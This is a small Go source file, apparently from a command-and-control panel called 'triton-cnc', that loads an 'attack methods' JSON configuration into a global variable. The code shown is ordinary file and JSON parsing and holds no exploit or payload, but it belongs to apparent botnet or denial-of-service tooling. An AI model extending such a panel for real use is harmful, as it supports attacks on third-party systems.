package build

import (
	"encoding/json"
	"io/ioutil"
	"os"

	"triton-cnc/core/models/json/meta"
	"triton-cnc/core/models/versions"
)

var AttackAPI *meta.AttackMethod

// config file parses from struct
func NewParse_Attack_Json() (error) {
	File, error := os.Open(versions.GOOS_Edition.Make["API_Attack"])
	if error != nil {
		return error
	}

	defer File.Close()

	ByteVal, error := ioutil.ReadAll(File)
	if error != nil {
		return error
	}

	var NewConfigAllo meta.AttackMethod
	error = json.Unmarshal(ByteVal, &NewConfigAllo)
	if error != nil {
		return error
	}

	AttackAPI = &NewConfigAllo
	

	return nil
}